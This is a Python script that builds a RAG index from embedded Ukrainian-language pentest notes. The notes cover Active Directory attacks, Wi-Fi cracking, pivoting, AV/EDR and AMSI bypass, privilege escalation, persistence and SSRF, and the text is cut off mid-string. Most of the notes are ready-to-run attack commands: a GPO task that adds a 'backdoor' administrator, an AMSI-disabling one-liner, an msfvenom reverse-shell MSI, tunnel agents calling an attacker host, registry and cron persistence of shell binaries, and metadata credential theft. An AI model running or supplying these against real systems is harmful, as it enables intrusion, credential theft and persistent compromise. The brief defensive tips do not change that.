import os
import json
import re
import sys

# Ensure indexing and ingestion modules can be imported
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ingestion import DocumentIngester
from indexing import RAGIndexManager

# Define workspaces and their files
workspaces_data = {
    "active_directory_security": {
        "title": "Active Directory Security (AD)",
        "files": {
            "ad_enumeration.md": """---
tags: [active-directory, enumeration, active-recon]
status: reference
date: 2026-06-27
type: guide
---

# Методологія розвідки та перелічення Active Directory

Розвідка Active Directory (AD Enumeration) є критичним етапом під час пентесту доменної інфраструктури Windows. Головна мета — зрозуміти структуру домену, ідентифікувати привілейовані облікові записи, комп'ютери та знайти потенційні шляхи атаки.

## 1. Автоматизований збір даних за допомогою BloodHound
**BloodHound** використовує теорію графів для візуалізації та виявлення прихованих зв'язків у домені AD.
* **Збір даних через SharpHound (з робочої станції Windows)**:
  ```cmd
  SharpHound.exe -c All --ZipFileName bloodhound_data.zip
  ```
* **Збір даних через Python-версію (з Linux-машини пентестера)**:
  ```bash
  bloodhound-python -u 'username' -p 'password' -d 'domain.local' -dc 'dc01.domain.local' -c All
  ```
* **Цільовий пошук**: Аналіз шляхів доступу від скомпрометованого користувача до групи `Domain Admins`.

## 2. Перелічення за допомогою PowerView
**PowerView** — це потужний скрипт PowerShell для дослідження AD без використання адмінських інструментів RSAT.
* **Отримання інформації про поточний домен**:
  ```powershell
  Get-NetDomain
  ```
* **Пошук привілейованих груп та їх членів**:
  ```powershell
  Get-NetGroupMember -GroupName "Domain Admins"
  ```
* **Виявлення комп'ютерів у домені**:
  ```powershell
  Get-NetComputer -FullData
  ```
* **Пошук активних користувацьких сесій на контролерах (для подальшого Mimikatz)**:
  ```powershell
  Find-LocalAdminAccess
  ```

## 3. Перелічення через протокол LDAP (з Linux)
Якщо у нас є лише мережевий доступ та дійсні облікові дані, ми можемо робити запити безпосередньо до служби каталогів LDAP:
```bash
ldapsearch -h dc01.domain.local -x -b "dc=domain,dc=local" -D "user@domain.local" -w "password" "(objectClass=user)" sAMAccountName
```

Див. також: [[kerberoasting_attack]] та [[as_rep_roasting]] для отримання первинного доступу, а також [[gpo_exploitation]] для закріплення.
""",
            "kerberoasting_attack.md": """---
tags: [active-directory, kerberos, kerberoasting, offline-cracking]
status: reference
date: 2026-06-27
type: attack-vector
---

# Атака Kerberoasting: теорія, експлуатація та захист

**Kerberoasting** — це техніка атаки на домени Active Directory, яка дозволяє отримати зашифровані паролі облікових записів служб (Service Accounts), що мають зареєстровані імена **SPN (Service Principal Name)**.

## 1. Суть атаки
Будь-який доменний користувач може запросити у контролера домену (KDC) квиток послуги (**TGS ticket**) для будь-якої служби з SPN. Цей квиток шифрується на основі хешу пароля облікового запису, під яким запущена служба. Отримавши TGS, атакуючий може витягти його з пам'яті та спробувати підібрати пароль локально в режимі офлайн методом перебору (Brute Force).

## 2. Експлуатація з Linux (через Impacket)
Якщо ми маємо доступ до мережі та будь-які доменні облікові дані, ми можемо виконати запит на TGS для всіх облікових записів з SPN:
```bash
GetUserSPNs.py -request -dc-ip 192.168.1.100 domain.local/username:password -outputfile kerb_hashes.txt
```
Параметр `-request` ініціює запит TGS квитків, які Impacket зберігає у форматі, придатному для Hashcat.

## 3. Офлайн зломування хешів
Для злому використовується утиліта **Hashcat** (режим 13100 для Kerberos 5 TGS-REP etype 23):
```bash
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 4. Методи протидії та захисту
* **Використання довгих паролів**: Паролі сервісних акаунтів мають бути не менше 25-30 випадкових символів.
* **Managed Service Accounts (gMSA)**: Переведення сервісів на використання групових керованих сервісних акаунтів, паролі яких автоматично керуються Active Directory та мають довжину 240 символів.
* **Обмеження прав**: Надання мінімально необхідних прав доступу для сервісних акаунтів.

Див. також: [[as_rep_roasting]] для атак без автентифікації та [[ad_enumeration]] для пошуку сервісних облікових записів.
""",
            "as_rep_roasting.md": """---
tags: [active-directory, kerberos, as-rep-roasting, preauth]
status: reference
date: 2026-06-27
type: attack-vector
---

# Атака AS-REP Roasting: експлуатація облікових записів без попередньої автентифікації

**AS-REP Roasting** — це атака на протокол автентифікації Kerberos в Active Directory, яка націлена на користувачів, для яких вимкнено вимогу попередньої автентифікації Kerberos (**Do not require Kerberos preauthentication**).

## 1. Принцип роботи атаки
За замовчуванням Kerberos вимагає, щоб користувач зашифрував поточний час своїм паролем при запиті квитка (AS-REQ), підтверджуючи, що він знає пароль. Якщо опцію `DONT_REQ_PREAUTH` активовано для користувача, контролер домену (KDC) одразу відповідає повідомленням AS-REP, яке містить зашифрована частина квитка. Атакуючий може запросити цей пакет для будь-якого користувача домену, навіть не знаючи його пароля, перехопити зашифровані дані та підібрати пароль локально.

## 2. Виявлення та збір хешів (Linux)
Для збору хешів використовується інструмент `GetNPUsers.py` з пакету Impacket.
* **Запит за списком користувачів з файлу**:
  ```bash
  GetNPUsers.py -request -dc-ip 192.168.1.100 domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
  ```
* **Запит без знання логінів (через анонімне LDAP-підключення, якщо дозволено)**:
  ```bash
  GetNPUsers.py -request -dc-ip 192.168.1.100 domain.local/ -format hashcat
  ```

## 3. Злом хешів за допомогою Hashcat
Отримані хеші зламуються у режимі 18200 (Kerberos 5 AS-REP etype 23):
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 4. Захист та виправлення вразливості
* **Аудит налаштувань**: Увімкнути вимогу попередньої автентифікації (Kerberos Preauthentication) для всіх облікових записів без винятку.
* **Пошук вразливих користувачів через PowerShell**:
  ```powershell
  Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth
  ```

Див. також: [[kerberoasting_attack]] та [[ad_enumeration]].
""",
            "gpo_exploitation.md": """---
tags: [active-directory, gpo, privilege-escalation, post-exploitation]
status: reference
date: 2026-06-27
type: guide
---

# Експлуатація групових політик (GPO) в Active Directory

Групові політики (**GPO**) використовуються адміністраторами для централізованого управління налаштуваннями комп'ютерів та користувачів у домені. Якщо атакуючий отримує права на запис або редагування хоча б одного GPO, він може скомпрометувати всі системи, до яких застосовується ця політика.

## 1. Пошук вразливих групових політик
Атакуючі шукають політики, на які звичайні користувачі або скомпрометовані групи мають права `WriteProperty`, `GenericWrite` або `GenericAll`.
* **Виявлення прав через PowerView**:
  ```powershell
  Get-NetGPO | Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -match "Domain Users"}
  ```
  *Примітка: Якщо група "Domain Users" має права запису на будь-який GPO, це означає повну компрометацію домену.*

## 2. Створення шкідливого завдання через GPO (Immediate Tasks)
За допомогою утиліти **SharpGPOAbuse** можна автоматизувати внесення змін до GPO для виконання довільних команд на цільових системах під обліковим записом `SYSTEM`.
* **Додавання негайного запланованого завдання (Immediate Task)**:
  ```cmd
  SharpGPOAbuse.exe --gponame "Default Domain Policy" --addsharedtask --taskname "UpdateOS" --author "Administrator" --command "cmd.exe" --arguments "/c net user backdoor Pass123! /add && net localgroup Administrators backdoor /add"
  ```
* Після оновлення політик на клієнтських комп'ютерах (кожні 90 хвилин або примусово через `gpupdate /force`) буде створено локального адміністратора з логіном `backdoor`.

## 3. Захист та моніторинг
* **Суворий аудит прав доступу (ACL)**: Обмежити доступ до редагування GPO лише для групи `Domain Admins`.
* **Моніторинг змін у SYSVOL**: Відстежувати несанкціоновані зміни у файлах конфігурації групових політик на контролерах домену.

Див. також: [[domain_compromise]] та [[ad_enumeration]].
""",
            "domain_compromise.md": """---
tags: [active-directory, domain-compromise, dcsync, golden-ticket]
status: reference
date: 2026-06-27
type: guide
---

# Повна компрометація домену AD: DCSync та Golden Ticket

Після отримання прав адміністратора домену або доступу до облікового запису з правами реплікації, пентестер може виконати атаку DCSync для вилучення всіх хешів паролів та створити Golden Ticket для тривалого закріплення в системі.

## 1. Атака DCSync (Вилучення хешів)
Атака **DCSync** дозволяє імітувати поведінку контролера домену та запитувати реплікацію даних (включаючи хеші паролів) через протокол MS-DRSR. Для цієї атаки не потрібен доступ до файлу `ntds.dit`.
* **Вимоги до привілеїв**: Обліковий запис повинен мати права `Replicating Directory Changes` та `Replicating Directory Changes All`.
* **Запуск через Mimikatz**:
  ```cmd
  lsadump::dcsync /domain:domain.local /user:krbtgt
  ```
* **Запуск через Impacket (з Linux)**:
  ```bash
  secretsdump.py domain.local/administrator:password@192.168.1.100 -just-dc-user krbtgt
  ```

## 2. Створення Golden Ticket (Золотий Квиток)
**Golden Ticket** — це підроблений квиток TGT (Ticket Granting Ticket), підписаний хешем облікового запису `krbtgt`. Він дозволяє отримати доступ до будь-кого ресурсу в домені з правами адміністратора на термін до 10 років.
* **Необхідні дані**: SID домену, хеш NTLM або AES256 акаунту `krbtgt`.
* **Створення квитка через Mimikatz**:
  ```cmd
  kerberos::golden /domain:domain.local /sid:S-1-5-21-12345678-12345678-12345678 /rc4:krbtgt_ntlm_hash /user:Administrator /id:500 /ticket:golden.kirbi
  ```
* **Імпорт квитка в поточну сесію**:
  ```cmd
  kerberos::ptt golden.kirbi
  ```

## 3. Захист та виявлення
* **Регулярна зміна пароля krbtgt**: Рекомендується змінювати пароль `krbtgt` двічі поспіль (для оновлення історії паролів) принаймні раз на рік.
* **Моніторинг трафіку реплікації**: Виявляти запити реплікації, які надходять не від IP-адрес легітимних контролерів домену.

Див. також: [[ad_enumeration]] та [[kerberoasting_attack]].
"""
        }
    },
    "network_infrastructure": {
        "title": "Network Infrastructure Security",
        "files": {
            "vlan_hopping_and_spoofing.md": """---
tags: [networking, vlan, vlan-hopping, switch-spoofing]
status: reference
date: 2026-06-27
type: attack-vector
---

# VLAN Hopping та атаки на протоколи комутації

**VLAN Hopping** — це метод атаки, який дозволяє відправляти трафік в інші VLAN (віртуальні локальні мережі) в обхід маршрутизатора або міжмережевого екрана.

## 1. Switch Spoofing (Підміна комутатора)
Комутатори використовують протокол **DTP (Dynamic Trunking Protocol)** для автоматичного визначення типу порту (Access або Trunk). Якщо порт налаштовано в режимі авто-узгодження, атакуючий може надіслати підроблений запит DTP та перевести свій порт у режим *Trunking*.
* **Експлуатація через Yersinia**:
  Атакуючий запускає графічний або консольний інтерфейс утиліти `yersinia` і надсилає запит "Enable Trunking". Після успішного переходу порту в режим Trunk, атакуючий отримує доступ до всіх VLAN, що проходять через цей комутатор.

## 2. Double Tagging (Подвійне тегування 802.1Q)
Ця атака працює лише якщо атакуючий підключений до порту, що належить до **Native VLAN** комутатора.
* **Механізм**: Атакуючий надсилає кадр з двома тегами 802.1Q. Перший тег (зовнішній) відповідає Native VLAN, другий (внутрішній) — цільовій VLAN.
* Комутатор отримує кадр, бачить Native VLAN, знімає зовнішній тег і пересилає кадр далі без тегу. Наступний комутатор бачить другий тег і направляє кадр у цільову VLAN.
* *Обмеження*: Атака є односторонньою (можна відправити дані, але не можна отримати відповідь).

## 3. Заходи захисту
* **Вимкнути DTP**: Перевести всі порти користувачів у режим access вручну:
  ```text
  switchport mode access
  switchport nonegotiate
  ```
* **Зміна Native VLAN**: Змінити ідентифікатор Native VLAN за замовчуванням (VLAN 1) на будь-яку іншу невикористовувану VLAN на всіх магістральних портах.
* **Вимкнути невикористовувані порти** та перемістити їх у карантинну VLAN.

Див. також: [[router_exploit_and_config]] та [[pivoting_and_tunneling]].
""",
            "router_exploit_and_config.md": """---
tags: [networking, routers, snmp, misconfiguration]
status: reference
date: 2026-06-27
type: guide
---

# Безпека маршрутизаторів та аналіз конфігурацій

Маршрутизатори та комутатори є критичними вузлами мережі. Неправильне налаштування або застаріле програмне забезпечення дозволяє атакуючому перехопити трафік або повністю контролювати інфраструктуру.

## 1. Слабкі місця протоколу SNMP
Протокол **SNMP** (Simple Network Management Protocol) часто використовується для моніторингу пристроїв. Версії SNMP v1 та v2c передають паролі (Community Strings) у відкритому вигляді.
* **Перелічення SNMP через snmpwalk**:
  ```bash
  snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1
  ```
* **Запис конфігурації через SNMP (якщо community string є 'private' з правами на запис)**:
  Атакуючий може надіслати команду OID для завантаження файлу конфігурації роутера на свій TFTP-сервер для аналізу.

## 2. Analis конфігурацій пристроїв (OpenWrt / Cisco)
Пентестер повинен перевіряти файли конфігурацій на наявність таких помилок:
* **Слабкі алгоритми хешування паролів**: Наприклад, використання `enable password` (тип 7 або md5) замість `enable secret` (тип 8/9, SHA-256/scrypt).
* **Невимкнені сервіси**: Активні сервіси Telnet, HTTP, FTP, які передають дані без шифрування.
* **Небезпечні налаштування віддаленого доступу**: Дозвіл підключення до SSH/Web панелі з будь-кої зовнішньої IP-адреси.

## 3. Відомі критичні CVE
* **CVE-2023-38035**: Вразливість обходу автентифікації в інтерфейсі управління деяких корпоративних маршрутизаторів, що дозволяє віддалено виконувати команди.

Див. також: [[vlan_hopping_and_spoofing]] та [[pivoting_and_tunneling]].
""",
            "wifi_wpa_cracking.md": """---
tags: [networking, wifi, wpa2, wpa3, pmkid, aircrack-ng]
status: reference
date: 2026-06-27
type: attack-vector
---

# Атаки на бездротові мережі Wi-Fi (WPA2/WPA3)

Бездротові мережі часто є точкою первинного входу в локальну інфраструктуру будинку або офісу.

## 1. Перехоплення WPA2 4-Way Handshake
Для отримання пароля WPA2-PSK необхідно перехопити процес рукостискання (Handshake) між клієнтом та точкою доступу.
* **Переведення адаптера в режим моніторингу**:
  ```bash
  sudo airmon-ng start wlan0
  ```
* **Сканування мереж**:
  ```bash
  sudo airodump-ng wlan0mon
  ```
* **Запуск перехоплення трафіку на конкретному каналі**:
  ```bash
  sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_handshake wlan0mon
  ```
* **Примусова деавтентифікація клієнта (для повторного підключення та захоплення handshake)**:
  ```bash
  sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
  ```

## 2. Атака без клієнтів: Перехоплення PMKID
Цей метод дозволяє отримати хеш для злому без необхідності чекати підключення клієнта до мережі.
* **Запуск hcxdumptool**:
  ```bash
  hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
  ```
* **Конвертація в сумісний з Hashcat формат**:
  ```bash
  hcxpcapngtool -o hash.22000 pmkid.pcapng
  ```

## 3. Злом паролів Wi-Fi через Hashcat
* **Злом WPA2 / PMKID**:
  ```bash
  hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
  ```

## 4. Специфіка WPA3
WPA3 використовує протокол **SAE (Simultaneous Authentication of Equals)**, який стійкий до офлайн перебору handshake. Проте існують атаки типу *Downgrade Attack*, коли пристрій змушують підключитися за стандартом WPA2, якщо активовано режим сумісності (Transition Mode).

Див. також: [[pivoting_and_tunneling]] для закріплення після отримання паролю до Wi-Fi.
""",
            "pivoting_and_tunneling.md": """---
tags: [networking, pivoting, tunneling, chisel, ligolo-ng, proxychains]
status: reference
date: 2026-06-27
type: guide
---

# Методологія Pivoting: перенаправлення трафіку в ізольовані мережі

**Pivoting** — це набір технік, які дозволяють пентестеру використовувати скомпрометований вузол мережі як шлюз (проксі) для доступу до інших пристроїв у внутрішніх, раніше недоступних сегментах мережі.

## 1. Створення тунелю через Chisel
**Chisel** — це швидкий інструмент для створення TCP/UDP тунелів через HTTP, зашифрований по SSH.
* **Запуск сервера на машині пентестера (Linux)**:
  ```bash
  chisel server -p 8080 --reverse
  ```
* **Запуск клієнта на скомпрометованому хості (Windows / Linux)**:
  ```bash
  # Для Windows
  chisel.exe client 192.168.1.50:8080 R:socks
  ```
  *Результат*: На машині пентестера відкривається локальний SOCKS5-проксі на порту 1080, через який можна сканувати внутрішню мережу.

## 2. Використання Proxychains
Для перенаправлення трафіку консольних утиліт (наприклад, Nmap або Sqlmap) через SOCKS проксі використовується **Proxychains**.
* **Конфігурація `/etc/proxychains4.conf`**:
  ```text
  socks5  127.0.0.1 1080
  ```
* **Запуск сканування через тунель**:
  ```bash
  proxychains nmap -sT -Pn -p 80,445 10.10.10.0/24
  ```
  *Важливо: Через SOCKS-проксі можна запускати лише TCP-сканування (`-sT`), SYN-сканування (`-sS`) та ICMP-пінги не підтримуються.*

## 3. Сучасний метод: Ligolo-ng
**Ligolo-ng** створює повноцінний інтерфейс TUN (віртуальна мережева карта) на машині пентестера, що дозволяє працювати без proxychains і запускати будь-які типи сканувань (включаючи SYN, UDP).
* **Налаштування інтерфейсу**:
  ```bash
  sudo ip tuntap add mode tun dev ligolo
  sudo ip link set dev ligolo up
  ```
* **Запуск проксі-сервера на Linux**:
  ```bash
  ./proxy -selfcert -laddr 0.0.0.0:11601
  ```
* **Запуск агента на цільовому хості**:
  ```bash
  ./agent -connect 192.168.1.50:11601 -ignore-cert
  ```

Див. також: [[vlan_hopping_and_spoofing]] та [[network_map_vulnerabilities]].
""",
            "network_map_vulnerabilities.md": """---
tags: [networking, topology, DMZ, firewall, active-recon]
status: reference
date: 2026-06-27
type: guide
---

# Мапування вразливостей архітектури локальної мережі

Аналіз помилок проектування мережевої архітектури, які полегшують горизонтальне переміщення атакуючого (Lateral Movement).

## 1. Відсутність сегментації (Flat Network)
У багатьох домашніх та невеликих корпоративних мережах відсутня сегментація. Пристрої IoT (Smart TV, розумні розетки), гостьові пристрої та сервери розробників знаходяться в одній підмережі.
* **Наслідки**: Компрометація одного IoT-пристрою (наприклад, камери спостереження через дефолтні паролі) дає миттєвий доступ до робочих станцій розробників з конфіденційними даними.

## 2. Помилки конфігурації DMZ (Демілітаризована зона)
Сервери, що обслуговують зовнішні запити (Web, Mail, VPN), мають бути ізольовані в DMZ.
* **Типова помилка**: Дозвіл серверам з DMZ ініціювати з'єднання у внутрішню довірчу мережу без обмежень портів. Якщо веб-сервер скомпрометовано через веб-вразливість, атакуючий використовує його для вільного сканування внутрішньої мережі (див. [[pivoting_and_tunneling]]).

## 3. Виявлення сервісів через протокол mDNS (Bonjour / Avahi)
Пристрої Apple (macOS, iOS) та Linux активно використовують mDNS для автоматичного налаштування зв'язку.
* **Аналіз трафіку**:
  Пентестер може запустити пасивний збір mDNS відповідей, щоб без активного сканування дізнатися імена хостів, версії ОС та сервіси:
  ```bash
  tcpdump -p -i eth0 -vv udp port 5353
  ```

Див. також: [[wifi_wpa_cracking]] та [[router_exploit_and_config]].
"""
        }
    },
    "endpoint_defense_evasion": {
        "title": "Endpoint Defense Evasion",
        "files": {
            "av_edr_bypass_techniques.md": """---
tags: [evasion, bypass, EDR, antivirus, amsi, shellcode]
status: reference
date: 2026-06-27
type: guide
---

# Техніки обходу антивірусів (AV) та EDR-систем

Сучасні системи захисту кінцевих точок (**EDR**) використовують як статичні сигнатури, так і динамічний поведінковий аналіз (API Hooking, евристику).

## 1. Обхід статичного аналізу (Signature Bypass)
Для приховування відомого шкідливого коду (наприклад, мімікацу або шелкоду) використовуються шифрування та обфускація:
* **Шифрування AES/XOR**: Код шифрується перед компіляцією та розшифровується безпосередньо в оперативній пам'яті перед виконанням (In-Memory Execution).
* **Зміна ентропії**: Занадто висока ентропія зашифрованого файлу може викликати підозру у AV. Для обходу додаються ресурси з легітимних програм або велика кількість нульових байтів.

## 2. Обхід динамічного аналізу: API Unhooking
EDR перехоплюють виклики критичних функцій Windows API (наприклад, `VirtualAllocEx`, `WriteProcessMemory`) шляхом модифікації коду в завантаженій бібліотеці `ntdll.dll` (додавання інструкції `JMP` на драйвер EDR).
* **Метод обходу**: Завантаження свіжої, чистої копії `ntdll.dll` з диска безпосередньо в пам'ять процесу та перезапис секції `.text`. Це видаляє всі перехоплення (hooks) EDR.
* **Direct System Calls**: Використання інструментів типу **Syswhispers** для отримання номерів системних викликів (syscalls) та виконання асемблерних інструкцій напряму, минаючи функції-обгортки Windows API.

## 3. Обхід AMSI (Antimalware Scan Interface)
AMSI інтегрується в PowerShell та WSH для аналізу скриптів перед виконанням.
* **Патч пам'яті AMSI (Bypass)**:
  Шляхом перезапису перших байтів функції `AmsiScanBuffer` у пам'яті поточного процесу PowerShell інструкцією повернення (`ret`), змушуючи AMSI завжди повертати результат `AMSI_RESULT_CLEAN`.
  ```powershell
  # Спрощений приклад патчу пам'яті через Reflection
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```

Див. також: [[privilege_escalation_windows]] та [[persistence_mechanisms]].
""",
            "privilege_escalation_windows.md": """---
tags: [windows, privilege-escalation, local-escalation, tokens]
status: reference
date: 2026-06-27
type: guide
---

# Підвищення привілеїв у Windows (Local Privilege Escalation)

Методи отримання прав локального адміністратора або облікового запису `NT AUTHORITY\\SYSTEM` на скомпрометованому хості Windows.

## 1. Вразливі служби (Unquoted Service Paths)
Якщо шлях до виконуваного файлу служби містить пробіли і не взятий у лапки, Windows намагатиметься знайти файл за кожним словом шляху.
* **Приклад**: `C:\\Program Files\\My Service\\binary.exe`
  Windows шукатиме:
  1. `C:\\Program.exe`
  2. `C:\\Program Files\\My.exe`
  3. `C:\\Program Files\\My Service\\binary.exe`
* Якщо звичайний користувач має права запису в корінь диска `C:\\`, він може зберегти свій шкідливий файл як `C:\\Program.exe` і перезапустити службу для отримання прав `SYSTEM`.

## 2. Зловживання привілеями токенів (Token Impersonation)
Якщо поточний обліковий запис має певні права (наприклад, `SeImpersonatePrivilege` або `SeAssignPrimaryTokenPrivilege`), він може перехопити токен іншого процесу або служби.
* **Експлуатація через PrintSpoofer або JuicyPotato**:
  Примушення локальних служб (наприклад, спулера друку) до автентифікації на створеному нами локальному іменованому каналі (Named Pipe). Оскільки служба працює від імені `SYSTEM`, ми перехоплюємо її токен:
  ```cmd
  PrintSpoofer.exe -c "cmd.exe /c net user admin Pass123! /add && net localgroup Administrators admin /add"
  ```

## 3. Реєстр Windows: AlwaysInstallElevated
Якщо в реєстрі встановлені такі параметри, будь-який користувач може встановити MSI-пакет, який виконається з правами `SYSTEM`.
* **Перевірка ключів**:
  * `HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`
  * `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`
* **Створення шкідливого MSI**:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o install.msi
  ```

Див. також: [[av_edr_bypass_techniques]] та [[persistence_mechanisms]].
""",
            "privilege_escalation_linux.md": """---
tags: [linux, privilege-escalation, suid, dirtypipe]
status: reference
date: 2026-06-27
type: guide
---

# Підвищення привілеїв у Linux (Local Privilege Escalation)

Методи отримання прав суперкористувача (`root`) на скомпрометованому хості Linux.

## 1. Зловживання правами SUID (Set Owner User ID)
Файли з бітом SUID запускаються з правами власника файлу (зазвичай `root`).
* **Пошук SUID файлів**:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
* **Експлуатація (на прикладі GTFOBins)**:
  Якщо адміністратор надав SUID-біт утиліті `find`, її можна використати для виконання системних команд від імені root:
  ```bash
  find . -exec /bin/sh -p \\; -quit
  ```

## 2. Вразливості ядра: Dirty Pipe (CVE-2022-0847)
Dirty Pipe — це критична вразливість у ядрах Linux (версії від 5.8 до 5.16.11), яка дозволяє перезаписувати дані в файлах, доступних тільки для читання.
* **Вектор атаки**: Атакуючий може перезаписати файл `/etc/passwd` або змінити пароль користувача `root` безпосередньо в пам'яті сторінок кешу, отримавши миттєвий доступ до шелу root.

## 3. Небезпечні конфігурації Sudo
Перевірка дозволених для запуску через sudo команд:
```bash
sudo -l
```
* **Приклад вразливості**: Якщо користувачу дозволено запускати `vi` або `nano` через sudo без пароля:
  ```text
  (root) NOPASSWD: /usr/bin/vi
  ```
* **Експлуатація**: Запустити `vi` і виконати командний рядок:
  ```bash
  sudo vi -c ':!/bin/sh'
  ```

Див. також: [[av_edr_bypass_techniques]] та [[persistence_mechanisms]].
""",
            "macos_tcc_bypass.md": """---
tags: [macos, tcc, privilege-escalation, sandbox]
status: reference
date: 2026-06-27
type: guide
---

# Безпека macOS: Архітектура TCC та методи обходу

Система **TCC** (Transparency, Consent, and Control) в macOS регулює доступ додатків до чутливих ресурсів, таких як мікрофон, камера, файли на Робочому столі, контакти та історія Safari.

## 1. Робота бази даних TCC
Налаштування дозволів зберігаються у двох базах даних SQLite:
* Системна (захищена SIP): `/Library/Application Support/com.apple.TCC/TCC.db`
* Користувацька: `~/Library/Application Support/com.apple.TCC/TCC.db`

## 2. Вектори обходу TCC
* **Зловживання правами додатків (Entitlements)**:
  Атакуючі шукають підписані легітимні додатки, які мають широкі права (наприклад, `com.apple.private.tcc.allow` або `Full Disk Access`), та намагаються впровадити в них свій код через перехоплення динамічних бібліотек (**dylib hijacking**).
* **Синтетичні кліки (Synthetic Events)**:
  Програмне натискання на кнопки дозволу в діалогових вікнах TCC. Хоча macOS блокує програмні кліки від стандартних скриптів, старі версії ОС мали вразливості, які дозволяли імітувати кліки миші через Accessibility API.
* **Вразливість з монтуванням образів**:
  Деякі версії macOS дозволяли монтувати кастомні образи дисків поверх папок TCC, підміняючи локальну базу даних TCC на власну з уже наданими дозволами.

Див. також: [[persistence_mechanisms]] для macOS.
""",
            "persistence_mechanisms.md": """---
tags: [persistence, scheduled-tasks, cron, registry]
status: reference
date: 2026-06-27
type: guide
---

# Закріплення в системі (Persistence Mechanisms)

Методи збереження доступу до скомпрометованих систем після перезавантаження комп'ютера або зміни пароля користувача.

## 1. Закріплення в Windows
* **Реєстр Windows (Run Keys)**:
  Запуск програми при кожному вході користувача в систему:
  ```cmd
  reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Backdoor" /t REG_SZ /d "C:\\temp\\shell.exe" /f
  ```
* **Служби Windows (Services)**:
  Створення служби, яка запускається автоматично при старті системи (потрібні права адміна):
  ```cmd
  sc create "UpdateService" binpath= "C:\\temp\\shell.exe" start= auto
  ```
* **Заплановані завдання (Scheduled Tasks)**:
  Створення завдання, що запускається кожну годину:
  ```cmd
  schtasks /create /tn "CheckUpdate" /tr "C:\\temp\\shell.exe" /sc hourly /mo 1 /ru "SYSTEM"
  ```

## 2. Закріплення в Linux
* **Cron завдання**:
  Додавання рядка в конфігурацію користувача cron:
  ```bash
  (crontab -l 2>/dev/null; echo "*/30 * * * * /tmp/shell.sh") | crontab -
  ```
* **Служби Systemd**:
  Створення власного сервісу у `/etc/systemd/system/backdoor.service`.

## 3. Закріплення в macOS
* **LaunchAgents та LaunchDaemons**:
  macOS використовує plist-файли для управління автозапуском.
  * `~/Library/LaunchAgents/` — запускається від імені користувача при вході.
  * `/Library/LaunchDaemons/` — запускається від імені `root` при старті системи.

Див. також: [[privilege_escalation_windows]] та [[privilege_escalation_linux]].
"""
        }
    },
    "web_api_exploitation": {
        "title": "Web & API Exploitation",
        "files": {
            "owasp_top_10_methodology.md": """---
tags: [web-security, owasp, injection, idor]
status: reference
date: 2026-06-27
type: guide
---

# Методологія тестування веб-додатків та OWASP Top 10

Аналіз та виявлення найпоширеніших вразливостей веб-додатків у локальних середовищах.

## 1. Впровадження SQL-коду (SQL Injection)
SQLi виникає, коли вхідні дані користувача конкатенуються безпосередньо з SQL-запитом без валідації або використання параметризованих запитів.
* **Ручне виявлення**: Введення символу одинарних лапок `'` або `"` у поля вводу з метою викликати синтаксичну помилку бази даних.
* **Автоматизований аналіз за допомогою SQLMap**:
  ```bash
  sqlmap -u "http://192.168.1.10/profile.php?id=1" --batch --dbs
  ```
* **Експлуатація**: Отримання доступу до таблиці користувачів, адміністративних паролів та виконання команд на сервері (див. [[database_exploitation]]).

## 2. Небезпечні прямі посилання на об'єкти (IDOR / BOLA)
IDOR (Insecure Direct Object Reference) виникає, коли додаток використовує ідентифікатори об'єктів для доступу до ресурсів без належної перевірки прав доступу користувача.
* **Приклад**:
  Користувач авторизований як ID 100, надсилає запит: `GET /api/v1/invoice?id=100`.
  Він змінює параметр `id` на `101` (інший користувач) і успішно переглядає чужий рахунок.

## 3. Заходи протидії
* Використовувати параметризовані запити (Prepared Statements) для запобігання SQLi.
* Впровадити суворий контроль доступу на рівні сервера для перевірки прав на кожен об'єкт перед його відправкою користувачу.

Див. також: [[ssrf_internal_network]] та [[jwt_token_compromise]].
""",
            "ssrf_internal_network.md": """---
tags: [web-security, ssrf, cloud-metadata, internal-networks]
status: reference
date: 2026-06-27
type: attack-vector
---

# Атака SSRF (Server-Side Request Forgery) у локальних мережах

**SSRF** — це вразливість, яка дозволяє зловмиснику змусити веб-додаток відправляти HTTP-запити від імені сервера на довільні адреси.

## 1. Вектор атаки на внутрішню інфраструктуру
Часто веб-сервери мають доступ до внутрішніх сервісів, які закриті фаєрволом від зовнішнього світу (наприклад, внутрішні API, бази даних, роутери або панелі моніторингу Kubernetes/Docker).
* **Сценарій**:
  Веб-додаток має функцію завантаження аватарки за URL-адресою: `POST /upload-avatar` з параметром `url=http://example.com/image.jpg`.
  Атакуючий передає локальну адресу: `url=http://192.168.1.1/admin` або `url=http://localhost:8080/admin` і переглядає відповідь внутрішнього сервісу через відповіді веб-додатку.

## 2. Атака на хмарні метадані (Cloud Metadata)
Якщо веб-сервер розгорнутий у хмарі (AWS, GCP, Azure), атакуючий використовує SSRF для запиту внутрішнього API метаданих:
* **AWS / GCP Metadata IP**: `http://169.254.169.254/latest/meta-data/`
* **Отримання тимчасових SSH-ключів або IAM токенів доступу**:
  ```bash
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
  ```

## 3. Заходи протидії
* **Чорні та білі списки**: Блокувати запити до локальних IP (127.0.0.1, 10.0.0.0/8, 192.168.0.0/16, 169.254.169.254).
* **Ізоляція мережі**: Веб-сервер не повинен мати доступу до панелей управління внутрішньою мережею.

Див. також: [[owasp_top_10_methodology]] та [[api_documentation_leaks]].
""",
            "jwt_token_compromise.md": """---
